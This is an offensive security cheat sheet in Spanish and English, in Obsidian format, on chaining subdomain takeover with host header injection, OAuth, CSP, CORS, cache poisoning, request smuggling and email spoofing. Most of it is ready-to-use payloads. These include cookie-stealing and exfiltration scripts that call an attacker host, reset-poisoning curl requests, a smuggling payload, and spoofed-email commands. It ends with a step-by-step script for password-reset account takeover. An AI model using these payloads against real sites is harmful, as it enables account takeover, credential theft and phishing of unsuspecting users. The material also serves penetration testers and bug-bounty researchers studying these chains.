---
aliases:
  - SDT Chains
  - Email Spoofing
  - HHI + Subdomain Takeover
  - Cookie Takeover Chain
tags:
  - vuln/subdomain-takeover
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Subdomain Takeover]]"
  - "[[Host Header Injection]]"
  - "[[Open Redirect]]"
  - "[[Web Cache Poisoning]]"
  - "[[Cross-Site Scripting (XSS)]]"
---
# Subdomain Takeover - Chains con Otras Vulns

---

## ATO via Cookie / OAuth Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Reclamar `auth.target.com` (Heroku/S3/Pages) → hostear fake login | ATO via fake login UI | Subdomain "auth.*" takeover. |
| `<script>fetch('//attacker?c='+document.cookie)</script>` en takeover sub | Cookie steal cross-subdomain | Cookies con `Domain=.target.com`. |
| `<script>document.cookie = "session=ATTACKER; Domain=.target.com; Path=/"</script>` | Session fixation via cookie tossing | Pre-auth flow. |
| Hostear OAuth `/cb?code=$STOLEN` listener en takeover → exchange post-capture | OAuth code interception | Wildcard `*.target.com` whitelist. |
| Hostear fake SAML SP en takeover sub con ACS URL | SAML assertion theft | SAML federation trust. |
| `<script>fetch('https://target.com/api/2fa/disable',{method:'POST',credentials:'include'})</script>` | 2FA disable via cookie + same-site CORS | Same-site trust. |
| Combine HHI + reclaim: `Host: reset.target.com` (taken) → reset link arrives en atacante | Reset poisoning chain | HHI + SDT compound. |
^sdt-chain-ato

---

## XSS Persistente via Subdomain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target.com \| grep -i 'content-security-policy'` y verificar `script-src *.target.com` | CSP whitelist permite subdomain JS | Pre-attack CSP analysis. |
| Hostear `evil.js` en subdomain reclamado → inject `<script src="https://taken.target.com/evil.js"></script>` | XSS via CSP-trusted subdomain | CSP source bypass. |
| `<script>navigator.serviceWorker.register('https://taken.target.com/sw.js')</script>` | Service Worker persistence at takeover sub | SW scope persistence. |
| `<iframe src="https://taken.target.com/phish.html"></iframe>` | UI injection via frame-src | CSP frame-src trust. |
| `<script>fetch('https://taken.target.com/exfil',{method:'POST',body:document.cookie})</script>` | Data exfil con CSP `connect-src *.target.com` | Data egress chain. |
| `localStorage.setItem('persistent_payload','<script>...')` desde takeover sub | LocalStorage poisoning | Same-origin persistence. |
| `<script>window.addEventListener('message',e=>fetch('//attacker?'+JSON.stringify(e.data)))</script>` en takeover sub | postMessage listener para captura | Cross-window data theft. |
^sdt-chain-xss

---

## HTTPS Cert Validation Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `certbot certonly --manual --preferred-challenges dns -d taken.target.com` | Let's Encrypt cert via DNS-01 | Subdomain reclamado con DNS control. |
| `certbot certonly --webroot -w /var/www/html -d taken.target.com` | Let's Encrypt cert via HTTP-01 | Reclamado con HTTP server control. |
| `acme.sh --issue -d taken.target.com --webroot /var/www/html` | acme.sh alternative | Sin certbot. |
| `openssl s_client -connect taken.target.com:443 -servername taken.target.com \| openssl x509 -noout -subject -issuer` | Verificar cert post-issue | Validation. |
| `curl -sI https://target.com \| grep -i 'strict-transport-security'` | Verificar HSTS y subdomain inclusion (`includeSubDomains`) | Defense check. |
| Servir contenido phishing con HTTPS valid en taken sub | Maximum trust phishing | Padlock + valid cert. |
| Combine MITM + cert: deploy en network where reclaimed sub IP es target | MITM con cert válido | Network-level attack. |
^sdt-chain-https

---

## Email Spoofing (SPF / DKIM)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short MX target.com` y `dig +short MX subdomain.target.com` | Verificar MX records — buscar dangling | Email infrastructure recon. |
| Reclamar third-party MX provider (mailgun/sendgrid abandoned account) | Email send/receive control | MX dangling. |
| `dig +short TXT target.com \| grep -i spf` y verificar `include:` directives | SPF includes — third-party lookup | SPF abuse setup. |
| Sign up Mailgun/SendGrid con dangling subdomain en SPF includes | Send valid SPF emails como target | SPF include reclaim. |
| `dig +short TXT default._domainkey.target.com` (DKIM) | DKIM TXT record — verificar key dangling | DKIM key reclaim setup. |
| `swaks --to victim@somewhere.com --from atacante@target.com --server mx.attacker.com --header "From: support@target.com"` | Test spoofed email delivery | Post-MX/SPF takeover. |
| `dig +short TXT _dmarc.target.com` y verificar `aspf=r` (relaxed) | DMARC alignment policy | Subdomain spoof allowance. |
| Trigger password reset con email a víctima → recibir reset link en MX takeover | ATO via email + MX combo | Compound chain. |
^sdt-chain-email

---

## Combine con HHI / Open Redirect / Cache Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "X-Forwarded-Host: taken.target.com" -d "email=victim@target.com" https://target.com/forgot` | HHI + SDT reset poisoning → reset email a takeover sub | HHI + SDT compound. |
| `https://idp.target.com/oauth/authorize?...&redirect_uri=https://taken.target.com/cb` | OAuth + SDT code theft | Wildcard OAuth whitelist. |
| `curl -H "X-Forwarded-Host: taken.target.com" https://target.com/login` (cache poison) | Cache poisoning via takeover host | Cache + HHI + SDT. |
| `curl -i -H "Connection: close" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" --data-binary $'1\r\nA\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: taken.target.com\r\n\r\n' https://target.com/` | HRS + SDT smuggling | HRS combo. |
| `<script>fetch('https://api.target.com/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker?d='+encodeURIComponent(d)))</script>` en takeover | CORS allowlist abuse | CORS trust subdomain. |
| `curl -sI https://target.com \| grep -iE 'csp\|cors\|content-security'` y mapear sub trust | Pre-chain analysis | Defense map. |
| `nc -lvnp 443` en taken sub → recibir tokens, codes, cookies | Listener for compound chain | Data collection. |
^sdt-chain-combos

### Compound chain example: HHI + SDT for ATO

```bash
# 1. Recon
dig +short CNAME docs.target.com
# → dead-heroku-app.herokuapp.com (dangling)

# 2. Reclaim subdomain
heroku create dead-heroku-app
heroku domains:add docs.target.com

# 3. Deploy capture endpoint
cat > index.js <<'EOF'
const http=require('http');
http.createServer((req,res)=>{
  console.log('CAPTURE:',req.url);
  fs.appendFileSync('captures.log',req.url+'\n');
  res.writeHead(302,{'Location':'https://target.com'+req.url});
  res.end();
}).listen(process.env.PORT);
EOF
git push heroku main

# 4. Trigger reset poisoning via HHI
curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: docs.target.com" \
  -d "email=victim@target.com" https://target.com/forgot

# 5. Email arrives at victim:
# "Reset password: https://docs.target.com/reset?token=ABC123"
# Domain legit, HTTPS valid → victim clicks

# 6. Victim hits docs.target.com/reset?token=ABC123
# Atacante captures token, redirects to legit /reset?token=ABC123
# Atacante uses token via legit endpoint → ATO complete

# CVSS: Critical (9.8) — HHI + SDT compound.
```

---
